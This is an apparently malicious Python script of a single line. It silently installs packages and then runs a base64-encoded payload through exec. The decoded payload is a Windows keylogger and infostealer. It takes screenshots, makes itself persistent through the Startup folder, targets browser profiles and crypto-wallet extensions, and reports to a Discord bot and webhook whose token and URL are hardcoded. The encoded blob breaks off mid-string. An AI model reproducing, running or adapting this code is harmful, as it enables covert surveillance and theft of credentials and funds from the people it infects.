import base64; import os; os.system('pip install pywin32 pycryptodome requests websocket-client pyautogui watchdog pygetwindow pywinauto psutil'); exec(base64.b64decode("aW1wb3J0IGJhc2U2NCAKaW1wb3J0IGpzb24gCmltcG9ydCByZSAKaW1wb3J0IHNxbGl0ZTMgCmltcG9ydCB6aXBmaWxlIAppbXBvcnQgc3lzIApmcm9tIHVybGxpYi5yZXF1ZXN0IGltcG9ydCBSZXF1ZXN0LCB1cmxvcGVuIApmcm9tIGRhdGV0aW1lIGltcG9ydCBkYXRldGltZQppbXBvcnQga2V5Ym9hcmQgCmltcG9ydCB3aW4zMmNvbS5jbGllbnQKaW1wb3J0IG5leHRjb3JkCmZyb20gbmV4dGNvcmQuZXh0IGltcG9ydCBjb21tYW5kcwppbXBvcnQgcHlhdXRvZ3VpIGFzIHAKZnJvbSBwYXRobGliIGltcG9ydCBQYXRoCmltcG9ydCBvcwppbXBvcnQgc2h1dGlsCmltcG9ydCBzdWJwcm9jZXNzCmltcG9ydCBweWF1dG9ndWkKaW1wb3J0IHRpbWUKZnJvbSB3YXRjaGRvZy5vYnNlcnZlcnMgaW1wb3J0IE9ic2VydmVyCmZyb20gd2F0Y2hkb2cuZXZlbnRzIGltcG9ydCBGaWxlU3lzdGVtRXZlbnRIYW5kbGVyCmltcG9ydCBweWdldHdpbmRvdyBhcyBndwpmcm9tIHB5d2luYXV0byBpbXBvcnQgYXBwbGljYXRpb24KaW1wb3J0IHBzdXRpbAppbXBvcnQgdGVtcGZpbGUKaW1wb3J0IHV1aWQKCmNsYXNzIFdpbmRvd01hbmFnZXI6CiAgICBkZWYgX19pbml0X18oc2VsZiwgd2luZG93X3RpdGxlPU5vbmUpOgogICAgICAgIHNlbGYud2luZG93X3RpdGxlID0gd2luZG93X3RpdGxlCiAgICAgICAgc2VsZi53aW5kb3cgPSBzZWxmLl9nZXRfd2luZG93X2J5X3RpdGxlKHdpbmRvd190aXRsZSkKCiAgICBkZWYgX2dldF93aW5kb3dfYnlfdGl0bGUoc2VsZiwgdGl0bGUpOgogICAgICAgIHRyeToKICAgICAgICAgICAgcmV0dXJuIGd3LmdldFdpbmRvd3NXaXRoVGl0bGUodGl0bGUpWzBdIGlmIHRpdGxlIGVsc2UgZ3cuZ2V0QWN0aXZlV2luZG93KCkKICAgICAgICBleGNlcHQgSW5kZXhFcnJvcjoKICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcihmIk5vIHdpbmRvdyBmb3VuZCB3aXRoIHRpdGxlOiB7dGl0bGV9IikKCiAgICBkZWYgZm9jdXNfd2luZG93KHNlbGYpOgogICAgICAgIGlmIHNlbGYud2luZG93OgogICAgICAgICAgICBzZWxmLndpbmRvdy5hY3RpdmF0ZSgpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiTm8gd2luZG93IHRvIGZvY3VzLiIpCgogICAgZGVmIHJlc2l6ZV93aW5kb3coc2VsZiwgd2lkdGgsIGhlaWdodCk6CiAgICAgICAgaWYgc2VsZi53aW5kb3c6CiAgICAgICAgICAgIHNlbGYud2luZG93LnJlc2l6ZVRvKHdpZHRoLCBoZWlnaHQpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiTm8gd2luZG93IHRvIHJlc2l6ZS4iKQoKICAgIGRlZiBtb3ZlX3dpbmRvdyhzZWxmLCB4LCB5KToKICAgICAgICBpZiBzZWxmLndpbmRvdzoKICAgICAgICAgICAgc2VsZi53aW5kb3cubW92ZVRvKHgsIHkpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiTm8gd2luZG93IHRvIG1vdmUuIikKCiAgICBkZWYgbWF4aW1pemVfd2luZG93KHNlbGYpOgogICAgICAgIGlmIHNlbGYud2luZG93OgogICAgICAgICAgICBzZWxmLndpbmRvdy5tYXhpbWl6ZSgpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiTm8gd2luZG93IHRvIG1heGltaXplLiIpCgogICAgZGVmIG1pbmltaXplX3dpbmRvdyhzZWxmKToKICAgICAgICBpZiBzZWxmLndpbmRvdzoKICAgICAgICAgICAgc2VsZi53aW5kb3cubWluaW1pemUoKQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIk5vIHdpbmRvdyB0byBtaW5pbWl6ZS4iKQoKICAgIGRlZiBnZXRfd2luZG93X3NpemUoc2VsZik6CiAgICAgICAgaWYgc2VsZi53aW5kb3c6CiAgICAgICAgICAgIHJldHVybiBzZWxmLndpbmRvdy5zaXplCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiTm8gd2luZG93IHRvIGdldCBzaXplIGZyb20uIikKCiAgICBkZWYgZ2V0X3dpbmRvd19wb3NpdGlvbihzZWxmKToKICAgICAgICBpZiBzZWxmLndpbmRvdzoKICAgICAgICAgICAgcmV0dXJuIHNlbGYud2luZG93LnRvcGxlZnQKICAgICAgICBlbHNlOgogICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJObyB3aW5kb3cgdG8gZ2V0IHBvc2l0aW9uIGZyb20uIikKCiAgICBkZWYgY2xvc2Vfd2luZG93KHNlbGYpOgogICAgICAgIGlmIHNlbGYud2luZG93OgogICAgICAgICAgICBhcHAgPSBhcHBsaWNhdGlvbi5BcHBsaWNhdGlvbigpLmNvbm5lY3QoaGFuZGxlPXNlbGYud2luZG93Ll9oV25kKQogICAgICAgICAgICBhcHAua2lsbCgpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiTm8gd2luZG93IHRvIGNsb3NlLiIpCgpjbGFzcyBTY3JlZW5zaG90VGFrZXI6CiAgICBkZWYgX19pbml0X18oc2VsZiwgc2F2ZV9kaXJlY3Rvcnk6IHN0ciA9ICJzY3JlZW5zaG90cyIpOgogICAgICAgIHNlbGYuc2F2ZV9kaXJlY3RvcnkgPSBQYXRoKHNhdmVfZGlyZWN0b3J5KQogICAgICAgIHNlbGYuc2F2ZV9kaXJlY3RvcnkubWtkaXIocGFyZW50cz1UcnVlLCBleGlzdF9vaz1UcnVlKQoKICAgIGRlZiB0YWtlX3NjcmVlbnNob3Qoc2VsZiwgZmlsZW5hbWU6IHN0ciA9IE5vbmUpIC0+IHN0cjoKICAgICAgICBpZiBmaWxlbmFtZSBpcyBOb25lOgogICAgICAgICAgICBmaWxlbmFtZSA9IGRhdGV0aW1lLm5vdygpLnN0cmZ0aW1lKCIlWS0lbS0lZF8lSC0lTS0lUy5wbmciKQogICAgICAgIGZpbGVwYXRoID0gc2VsZi5zYXZlX2RpcmVjdG9yeSAvIGZpbGVuYW1lCiAgICAgICAgc2NyZWVuc2hvdCA9IHB5YXV0b2d1aS5zY3JlZW5zaG90KCkKICAgICAgICBzY3JlZW5zaG90LnNhdmUoZmlsZXBhdGgpCiAgICAgICAgcmV0dXJuIHN0cihmaWxlcGF0aCkKCiAgICBkZWYgdGFrZV9zY3JlZW5zaG90X3dpdGhfZGltZW5zaW9ucyhzZWxmLCBmaWxlbmFtZTogc3RyID0gTm9uZSwgcmVnaW9uOiB0dXBsZSA9IE5vbmUpIC0+IHN0cjoKICAgICAgICBpZiBmaWxlbmFtZSBpcyBOb25lOgogICAgICAgICAgICBmaWxlbmFtZSA9IGRhdGV0aW1lLm5vdygpLnN0cmZ0aW1lKCIlWS0lbS0lZF8lSC0lTS0lUy5wbmciKQogICAgICAgIGZpbGVwYXRoID0gc2VsZi5zYXZlX2RpcmVjdG9yeSAvIGZpbGVuYW1lCiAgICAgICAgc2NyZWVuc2hvdCA9IHB5YXV0b2d1aS5zY3JlZW5zaG90KHJlZ2lvbj1yZWdpb24pCiAgICAgICAgc2NyZWVuc2hvdC5zYXZlKGZpbGVwYXRoKQogICAgICAgIHJldHVybiBzdHIoZmlsZXBhdGgpCgojIEluaXRpYWxpemUgdGhlIGJvdAppbnRlbnRzID0gbmV4dGNvcmQuSW50ZW50cy5kZWZhdWx0KCkKaW50ZW50cy5tZXNzYWdlX2NvbnRlbnQgPSBUcnVlCmludGVudHMuZ3VpbGRzID0gVHJ1ZQppbnRlbnRzLm1lbWJlcnMgPSBUcnVlCmJvdCA9IGNvbW1hbmRzLkJvdChjb21tYW5kX3ByZWZpeD0iISIsIGludGVudHM9aW50ZW50cykKCiMgUmVjb3JkIHRoZSBzdGFydCB0aW1lIHdoZW4gdGhlIHNjcmlwdCBzdGFydHMKc3RhcnRfdGltZSA9IHRpbWUudGltZSgpCgojIEdldCB0aGUgcGF0aCBvZiB0aGUgY3VycmVudCBzY3JpcHQKc2NyaXB0X3BhdGggPSBzeXMuYXJndlswXQoKIyBEZWZpbmUgdGhlIHRhcmdldCBkaXJlY3RvcnkgKFN0YXJ0dXAgZm9sZGVyKQpzdGFydHVwX2ZvbGRlciA9IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWydBUFBEQVRBJ10sIHIiTWljcm9zb2Z0XFdpbmRvd3NcU3RhcnQgTWVudVxQcm9ncmFtc1xTdGFydHVwIikKCgojIEluaXRpYWxpemUgdGhlIFNjcmVlbnNob3RUYWtlcgpzY3JlZW5zaG90X3Rha2VyID0gU2NyZWVuc2hvdFRha2VyKCkKCiMgVG8gc3RvcCB0aGUgY29kZSBmcm9tIHN0b3BwaW5nIHdoZW4gdGhlIGN1cnNvciBpcyBpbiB0aGUgY29ybmVyIG9mIHRoZSBzY3JlZW4KcHlhdXRvZ3VpLkZBSUxTQUZFID0gRmFsc2UKCiMgRnVuY3Rpb24gdG8gZ2V0IGF2YWlsYWJsZSBkcml2ZXMKZGVmIGdldF9hdmFpbGFibGVfZHJpdmVzKCk6CiAgICByZXR1cm4gW2Yie2NocihkKX06XFwiIGZvciBkIGluIHJhbmdlKDY1LCA5MSkgaWYgb3MucGF0aC5leGlzdHMoZiJ7Y2hyKGQpfTpcXCIpXQoKIyBDcmVhdGUgYSBsaXN0IG9mIGRpcmVjdG9yaWVzIHRvIG1vbml0b3IKZHJpdmVzX3RvX21vbml0b3IgPSBnZXRfYXZhaWxhYmxlX2RyaXZlcygpCgojIEV4YW1wbGUgZGlyZWN0b3J5IHRvIG1vbml0b3IsIG1vZGlmeSBhcyBuZWVkZWQKIyBIZXJlIHdlIGFyZSBhc3N1bWluZyB5b3Ugd2FudCB0byBtb25pdG9yIGFsbCBhdmFpbGFibGUgZHJpdmVzCnBhdGhfdG9fbW9uaXRvciA9IGRyaXZlc190b19tb25pdG9yCgoKIyBSZXBsYWNlIHdpdGggeW91ciBib3QncyB0b2tlbiBhbmQgdGhlIGNoYW5uZWwgSUQgd2hlcmUgeW91IHdhbnQgdG8gc2VuZCB0aGUgbWVzc2FnZQpUT0tFTiA9ICdNVEl5TkRNek1UZzRPRFF5TURnME56WTNOZy5HMlRTcEcuOXlOYnAzc3IxQTdWbFdseXFHYTV2Tjdua0UyYXhTYlJzeEdhMTQnCkdVSUxEX0lEID0gMTI3Njk5NTgxNTg4MTA0ODE5NAoKCgpkZWYgZ2V0X3Nlc3Npb25faWQoKToKICAgIHRlbXBfZmlsZSA9IG9zLnBhdGguam9pbih0ZW1wZmlsZS5nZXR0ZW1wZGlyKCksICJzZXNzaW9uX2lkLnR4dCIpCgogICAgaWYgb3MucGF0aC5leGlzdHModGVtcF9maWxlKToKICAgICAgICAjIFJlYWQgdGhlIGV4aXN0aW5nIHNlc3Npb24gSUQKICAgICAgICB3aXRoIG9wZW4odGVtcF9maWxlLCAiciIpIGFzIGY6CiAgICAgICAgICAgIHNlc3Npb25faWQgPSBmLnJlYWQoKS5zdHJpcCgpCiAgICBlbHNlOgogICAgICAgICMgR2VuZXJhdGUgYSBuZXcgc2Vzc2lvbiBJRAogICAgICAgIHNlc3Npb25faWQgPSBzdHIodXVpZC51dWlkNCgpKQogICAgICAgIHdpdGggb3Blbih0ZW1wX2ZpbGUsICJ3IikgYXMgZjoKICAgICAgICAgICAgZi53cml0ZShzZXNzaW9uX2lkKQoKICAgIHJldHVybiBzZXNzaW9uX2lkCgojIFNlc3Npb24tc3BlY2lmaWMgdmFyaWFibGVzClNFU1NJT05fSUQgPSBnZXRfc2Vzc2lvbl9pZCgpCkNBVEVHT1JZX05BTUUgPSBTRVNTSU9OX0lECkNIQU5ORUxfTkFNRVMgPSBbImtleXN0cm9rZXMiLCAiZ2VuZXJhbCJdCgprZXlzdHJva2VzID0gTm9uZQpnZW5lcmFsID0gTm9uZQpsb2dzID0gTm9uZQp3ZWJob29rID0gTm9uZQp1cmxfID0gImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzEzMTI0NDYwNzk4Nzg1NjU5ODgvMUtlTHZneHI1WGM1MzF4LVhYUUZ0Q1pRd05pTGlPc3c2V2c2LVdZYklKNXlrYk5MN1B4REdxeldUWE9kZTU4bi1UbjIiCgoKQGJvdC5ldmVudAphc3luYyBkZWYgb25fcmVhZHkoKToKICAgIGdsb2JhbCBrZXlzdHJva2VzLCBnZW5lcmFsLCB3ZWJob29rLCB1cmxfCgogICAgcHJpbnQoIkJvdCBpcyByZWFkeSBhbmQgbGlzdGVuaW5nIGZvciBrZXlzdHJva2VzLiIpCiAgICBwcmludCgiUHJlc3MgJ2VzYycgdG8gZXhpdC4iKQoKICAgICMgRGVidWcgcHJpbnRzIHRvIGNoZWNrIGJvdCdzIHN0YXRlCiAgICBwcmludChmIkJvdCB1c2VyOiB7Ym90LnVzZXJ9IikKICAgIHRyeToKICAgICAgICBndWlsZF9uYW1lcyA9IFtndWlsZC5uYW1lLmVuY29kZSgnYXNjaWknLCAnaWdub3JlJykuZGVjb2RlKCkgZm9yIGd1aWxkIGluIGJvdC5ndWlsZHNdCiAgICAgICAgcHJpbnQoZiJDb25uZWN0ZWQgdG8gZ3VpbGRzOiB7Z3VpbGRfbmFtZXN9IikKICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICBwcmludChmIkNvbm5lY3RlZCB0byB7bGVuKGJvdC5ndWlsZHMpfSBndWlsZHMiKQogICAgCiAgICBndWlsZCA9IGJvdC5nZXRfZ3VpbGQoR1VJTERfSUQpCiAgICBwcmludChmIkF0dGVtcHRpbmcgdG8gZ2V0IGd1aWxkIHdpdGggSUQge0dVSUxEX0lEfSIpCiAgICBwcmludChmIkZvdW5kIGd1aWxkOiB7Z3VpbGR9IikKICAgIAogICAgaWYgbm90IGd1aWxkOgogICAgICAgIHByaW50KGYiR3VpbGQgd2l0aCBJRCB7R1VJTERfSUR9IG5vdCBmb3VuZCEiKQogICAgICAgIHByaW50KGYiQXZhaWxhYmxlIGd1aWxkczoge1soZy5pZCkgZm9yIGcgaW4gYm90Lmd1aWxkc119IikKICAgICAgICByZXR1cm4KCiAgICAjIENoZWNrIGlmIHRoZSBjYXRlZ29yeSBleGlzdHMKICAgIGNhdGVnb3J5ID0gbmV4dGNvcmQudXRpbHMuZ2V0KGd1aWxkLmNhdGVnb3JpZXMsIG5hbWU9Q0FURUdPUllfTkFNRSkKICAgIHByaW50KGYiRm91bmQgY2F0ZWdvcnk6IHtjYXRlZ29yeX0iKSAgIyBEZWJ1ZyBwcmludAogICAgCiAgICBpZiBub3QgY2F0ZWdvcnk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICAjIENyZWF0ZSB0aGUgY2F0ZWdvcnkgYW5kIGNoYW5uZWxzCiAgICAgICAgICAgIGNhdGVnb3J5ID0gYXdhaXQgZ3VpbGQuY3JlYXRlX2NhdGVnb3J5KENBVEVHT1JZX05BTUUpCiAgICAgICAgICAgIGZvciBjaGFubmVsX25hbWUgaW4gQ0hBTk5FTF9OQU1FUzoKICAgICAgICAgICAgICAgIGF3YWl0IGd1aWxkLmNyZWF0ZV90ZXh0X2NoYW5uZWwoY2hhbm5lbF9uYW1lLCBjYXRlZ29yeT1jYXRlZ29yeSkKICAgICAgICAgICAgcHJpbnQoZiJDcmVhdGVkIGNhdGVnb3J5ICd7Q0FURUdPUllfTkFNRX0nIHdpdGggY2hhbm5lbHM6IHsnLCAnLmpvaW4oQ0hBTk5FTF9OQU1FUyl9IikKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHByaW50KGYiRXJyb3IgY3JlYXRpbmcgY2F0ZWdvcnkvY2hhbm5lbHM6IHtlfSIpICAjIERlYnVnIHByaW50CiAgICBlbHNlOgogICAgICAgIHByaW50KGYiQ2F0ZWdvcnkgJ3tDQVRFR09SWV9OQU1FfScgYWxyZWFkeSBleGlzdHMuIikKCiAgICAjIEFzc2lnbiBjaGFubmVsIG9iamVjdHMgdG8gZ2xvYmFsIHZhcmlhYmxlcwogICAga2V5c3Ryb2tlcyA9IG5leHRjb3JkLnV0aWxzLmdldChjYXRlZ29yeS50ZXh0X2NoYW5uZWxzLCBuYW1lPSJrZXlzdHJva2VzIikKICAgIGdlbmVyYWwgPSBuZXh0Y29yZC51dGlscy5nZXQoY2F0ZWdvcnkudGV4dF9jaGFubmVscywgbmFtZT0iZ2VuZXJhbCIpCgogICAgZGF0YSA9IHsKICAgICAgICAiY29udGVudCI6IGYiTmV3IFNlc3Npb24gYXQgW3tjdXJyZW50X3RpbWV9XSB8IHtVU0VSTkFNRX0iCiAgICB9CiAgICByZXNwb25zZSA9IHJlcXVlc3RzLnBvc3QodXJsXywganNvbj1kYXRhKQoKICAgIAogICAgIyBNYWtlIHN1cmUgdGhlIFN0YXJ0dXAgZm9sZGVyIGV4aXN0cwogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKHN0YXJ0dXBfZm9sZGVyKToKICAgICAgICBwcmludCgiU3RhcnR1cCBmb2xkZXIgZG9lcyBub3QgZXhpc3QuIikKICAgIGVsc2U6CiAgICAgICAgIyBEZWZpbmUgdGhlIHBhdGggd2hlcmUgdGhlIHNjcmlwdCB3aWxsIGJlIGNvcGllZAogICAgICAgIHRhcmdldF9wYXRoID0gb3MucGF0aC5qb2luKHN0YXJ0dXBfZm9sZGVyLCBvcy5wYXRoLmJhc2VuYW1lKHNjcmlwdF9wYXRoKSkgICMgWW91IGNhbiBjaGFuZ2UgdGhlIG5hbWUgb2YgdGhlIGNvcGllZCBzY3JpcHQKCiAgICAgICAgIyBDaGVjayBpZiB0aGUgc2NyaXB0IGFscmVhZHkgZXhpc3RzIGluIHRoZSBTdGFydHVwIGZvbGRlcgogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKHRhcmdldF9wYXRoKToKICAgICAgICAgICAgcHJpbnQoZiJTY3JpcHQgYWxyZWFkeSBleGlzdHMgaW4gdGhlIFN0YXJ0dXAgZm9sZGVyOiB7dGFyZ2V0X3BhdGh9IikKICAgICAgICBlbHNlOgogICAgICAgICAgICAjIENvcHkgdGhlIHNjcmlwdCB0byB0aGUgU3RhcnR1cCBmb2xkZXIKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgc2h1dGlsLmNvcHkoc2NyaXB0X3BhdGgsIHRhcmdldF9wYXRoKQogICAgICAgICAgICAgICAgcHJpbnQoZiJTY3JpcHQgY29waWVkIHRvIHt0YXJnZXRfcGF0aH0iKQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICBwcmludChmIkVycm9yOiB7ZX0iKQogICAgCiAgICAKCgpjdXJyZW50X3RpbWUgPSBkYXRldGltZS5ub3coKS5zdHJmdGltZSgiJUg6JU06JVMiKQoKQ1VSUkVOVF9JTlRFUlBSRVRFUiA9IHN5cy5leGVjdXRhYmxlCgpwcm9jID0gc3VicHJvY2Vzcy5Qb3BlbihbQ1VSUkVOVF9JTlRFUlBSRVRFUiwgIi1tIiwgInBpcCIsICJpbnN0YWxsIiwgInB5Y3J5cHRvZG9tZSIsICJweXBpd2luMzIiLCAicHl3aW4zMiIsInJlcXVlc3RzIiwgIndlYnNvY2tldC1jbGllbnQiXSwgc3Rkb3V0PXN1YnByb2Nlc3MuREVWTlVMTCwgc3RkZXJyPXN1YnByb2Nlc3MuREVWTlVMTCxjcmVhdGlvbmZsYWdzPXN1YnByb2Nlc3MuQ1JFQVRFX05PX1dJTkRPVykKCnByb2Mud2FpdCgpCgp0cnk6CgogICAgaW1wb3J0IHdpbjMyY3J5cHQKCiAgICBmcm9tIENyeXB0by5DaXBoZXIgaW1wb3J0IEFFUwoKICAgIGltcG9ydCByZXF1ZXN0cwoKICAgIGltcG9ydCB3ZWJzb2NrZXQKCmV4Y2VwdDoKCiAgICBjdXJyZW50X2ZpbGUgPSBvcy5wYXRoLmFic3BhdGgoX19maWxlX18pCgogICAgc3VicHJvY2Vzcy5Qb3BlbihbQ1VSUkVOVF9JTlRFUlBSRVRFUiwgY3VycmVudF9maWxlXSwgc3Rkb3V0PXN1YnByb2Nlc3MuREVWTlVMTCwgc3RkZXJyPXN1YnByb2Nlc3MuREVWTlVMTCxjcmVhdGlvbmZsYWdzPXN1YnByb2Nlc3MuQ1JFQVRFX05PX1dJTkRPVykKCiAgICBleGl0KCkKCgoKCgpVU0VSX1BST0ZJTEUgPSBvcy5nZXRlbnYoJ1VTRVJQUk9GSUxFJykKCkFQUERBVEEgPSBvcy5nZXRlbnYoJ0FQUERBVEEnKQoKTE9DQUxBUFBEQVRBID0gb3MuZ2V0ZW52KCdMT0NBTEFQUERBVEEnKQoKU1RPUkFHRV9QQVRIID0gQVBQREFUQSArICJcXGdydXBwZV9zdG9yYWdlIgoKU1RBUlRVUF9QQVRIID0gb3MucGF0aC5qb2luKEFQUERBVEEsICJNaWNyb3NvZnQiLCAiV2luZG93cyIsICJTdGFydCBNZW51IiwgIlByb2dyYW1zIiwgIlN0YXJ0dXAiKQoKVVNFUk5BTUUgPSBvcy5lbnZpcm9uLmdldCgiVVNFUk5BTUUiKSBvciBvcy5lbnZpcm9uLmdldCgiVVNFUiIpCgoKCmlmIG5vdCBvcy5wYXRoLmV4aXN0cyhTVE9SQUdFX1BBVEgpOgoKICAgIG9zLm1ha2VkaXJzKFNUT1JBR0VfUEFUSCkKCgoKQ0hST01JVU1fQlJPV1NFUlMgPSBbCgogICAgeyJuYW1lIjogIkdvb2dsZSBDaHJvbWUiLCAicGF0aCI6IG9zLnBhdGguam9pbihMT0NBTEFQUERBVEEsICJHb29nbGUiLCAiQ2hyb21lIiwgIlVzZXIgRGF0YSIpLCAidGFza25hbWUiOiAiY2hyb21lLmV4ZSJ9LAoKICAgIHsibmFtZSI6ICJNaWNyb3NvZnQgRWRnZSIsICJwYXRoIjogb3MucGF0aC5qb2luKExPQ0FMQVBQREFUQSwgIk1pY3Jvc29mdCIsICJFZGdlIiwgIlVzZXIgRGF0YSIpLCAidGFza25hbWUiOiAibXNlZGdlLmV4ZSJ9LAoKICAgIHsibmFtZSI6ICJPcGVyYSIsICJwYXRoIjogb3MucGF0aC5qb2luKEFQUERBVEEsICJPcGVyYSBTb2Z0d2FyZSIsICJPcGVyYSBTdGFibGUiKSwgInRhc2tuYW1lIjogIm9wZXJhLmV4ZSJ9LAoKICAgIHsibmFtZSI6ICJPcGVyYSBHWCIsICJwYXRoIjogb3MucGF0aC5qb2luKEFQUERBVEEsICJPcGVyYSBTb2Z0d2FyZSIsICJPcGVyYSBHWCBTdGFibGUiKSwgInRhc2tuYW1lIjogIm9wZXJhLmV4ZSJ9LAoKICAgIHsibmFtZSI6ICJCcmF2ZSIsICJwYXRoIjogb3MucGF0aC5qb2luKExPQ0FMQVBQREFUQSwgIkJyYXZlU29mdHdhcmUiLCAiQnJhdmUtQnJvd3NlciIsICJVc2VyIERhdGEiKSwgInRhc2tuYW1lIjogImJyYXZlLmV4ZSJ9LAoKICAgIHsibmFtZSI6ICJZYW5kZXgiLCAicGF0aCI6IG9zLnBhdGguam9pbihBUFBEQVRBLCAiWWFuZGV4IiwgIllhbmRleEJyb3dzZXIiLCAiVXNlciBEYXRhIiksICJ0YXNrbmFtZSI6ICJ5YW5kZXguZXhlIn0sCgpdCgoKCkNIUk9NSVVNX1NVQlBBVEhTID0gWwoKICAgIHsibmFtZSI6ICJOb25lIiwgInBhdGgiOiAiIn0sCgogICAgeyJuYW1lIjogIkRlZmF1bHQiLCAicGF0aCI6ICJEZWZhdWx0In0sCgogICAgeyJuYW1lIjogIlByb2ZpbGUgMSIsICJwYXRoIjogIlByb2ZpbGUgMSJ9LAoKICAgIHsibmFtZSI6ICJQcm9maWxlIDIiLCAicGF0aCI6ICJQcm9maWxlIDIifSwKCiAgICB7Im5hbWUiOiAiUHJvZmlsZSAzIiwgInBhdGgiOiAiUHJvZmlsZSAzIn0sCgogICAgeyJuYW1lIjogIlByb2ZpbGUgNCIsICJwYXRoIjogIlByb2ZpbGUgNCJ9LAoKICAgIHsibmFtZSI6ICJQcm9maWxlIDUiLCAicGF0aCI6ICJQcm9maWxlIDUifSwKCl0KCgoKQlJPV1NFUl9FWFRFTlNJT05TID0gWwoKICAgIHsibmFtZSI6ICJBdXRoZW50aWNhdG9yIiwgInBhdGgiOiAiXFxMb2NhbCBFeHRlbnNpb24gU2V0dGluZ3NcXGJoZ2hvYW1hcGNkcGJvaHBoaWdvb29hZGRpbnBrYmFpIn0sCgogICAgeyJuYW1lIjogIkJpbmFuY2UiLCAicGF0aCI6ICJcXExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xcZmhib2hpbWFlbGJvaHBqYmJsZGNuZ2NuYXBuZG9kanAifSwKCiAgICB7Im5hbWUiOiAiQml0YXBwIiwgInBhdGgiOiAiXFxMb2NhbCBFeHRlbnNpb24gU2V0dGluZ3NcXGZpaGtha2ZvYmtta2pvanBjaHBmZ2NtaGZqbm1uZnBpIn0sCgogICAgeyJuYW1lIjogIkJvbHRYIiwgInBhdGgiOiAiXFxMb2NhbCBFeHRlbnNpb24gU2V0dGluZ3NcXGFvZGtrYWduYWRjYm9iZnBnZ2ZuamVvbmdlbWpiamNhIn0sCgogICAgeyJuYW1lIjogIkNvaW45OCIsICJwYXRoIjogIlxcTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzXFxhZWFjaGtubWVmcGhlcGNjaW9uYm9vaGNrb25vZWVtZyJ9LAoKICAgIHsibmFtZSI6ICJDb2luYmFzZSIsICJwYXRoIjogIlxcTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzXFxobmZhbmtub2NmZW9mYmRkZ2Npam5taG5mbmtkbmFhZCJ9LAoKICAgIHsibmFtZSI6ICJDb3JlIiwgInBhdGgiOiAiXFxMb2NhbCBFeHRlbnNpb24gU2V0dGluZ3NcXGFnb2FrZmVqamFib21lbXBramxlcGRmbGFsZWVvYmhiIn0sCgogICAgeyJuYW1lIjogIkNyb2NvYml0IiwgInBhdGgiOiAiXFxMb2NhbCBFeHRlbnNpb24gU2V0dGluZ3NcXHBubGZqbWxjamRqZ2tkZGVjZ2luY25kZmdlZ2tlY2tlIn0sCgogICAgeyJuYW1lIjogIkVxdWFsIiwgInBhdGgiOiAiXFxMb2NhbCBFeHRlbnNpb24gU2V0dGluZ3NcXGJsbmllaWlmZmJvaWxsa25qbmVwb2dqaGtnbm9hcGFjIn0sCgogICAgeyJuYW1lIjogIkV2ZXIiLCAicGF0aCI6ICJcXExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xcY2dlZW9kcGZhZ2pjZWVmaWVmbG1kZnBocGxrZW5sZmsifSwKCiAgICB7Im5hbWUiOiAiRXhvZHVzV2ViMyIsICJwYXRoIjogIlxcTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzXFxhaG9scGZkaWFsamdqZmhvbWloa2pibWdqaWRsY2RubyJ9LAoKICAgIHsibmFtZSI6ICJGZXdjaGEiLCAicGF0aCI6ICJcXExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xcZWJmaWRwcGxoYWJlZWRwbmhqbm9iZ2hva3BpaW9vbGoifSwKCiAgICB7Im5hbWUiOiAiRmlubmllIiwgInBhdGgiOiAiXFxMb2NhbCBFeHRlbnNpb24gU2V0dGluZ3NcXGNqbWtuZGpobmFnY2ZicGllbW5rZHBvbWNjbmpibG1qIn0sCgogICAgeyJuYW1lIjogIkd1YXJkYSIsICJwYXRoIjogIlxcTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzXFxocGdsZmhnZm5oYmdwamRlbmpnbWRnb2VpYXBwYWZsbiJ9LAoKICAgIHsibmFtZSI6ICJHdWlsZCIsICJwYXRoIjogIlxcTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzXFxuYW5qbWRrbmhraW5pZm5rZ2RjZ2djZm5oZGFhbW1taiJ9LAoKICAgIHsibmFtZSI6ICJIYXJtb255T3V0ZGF0ZWQiLCAicGF0aCI6ICJcXExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xcZm5uZWdwaGxvYmpkcGtoZWNhcGtpampka2djamhraWIifSwKCiAgICB7Im5hbWUiOiAiSWNvbmV4IiwgInBhdGgiOiAiXFxMb2NhbCBFeHRlbnNpb24gU2V0dGluZ3NcXGZscGljaWlsZW1naGJtZmFsaWNham9vbGhra2VuZmVsIn0sCgogICAgeyJuYW1lIjogIkpheHggTGliZXJ0eSIsICJwYXRoIjogIlxcTG9jYWwgRXh0ZW5zaW9uIFNldHRpbmdzXFxjamVsZnBscGxlYmRqamVubGxwamNibG1qa2ZjZmZuZSJ9LAoKICAgIHsibmFtZSI6ICJLYWlrYXMiLCAicGF0aCI6ICJcXExvY2FsIEV4dGVuc2lvbiBTZXR0aW5nc1xcamJsbmRsaXBlb2dwYWZubGRoZ21hcGFnY2NjZmNocGkifSwKCiAgICB7Im5hbWUiOiAiS2FyZGlhQ2hhaW4iLCAi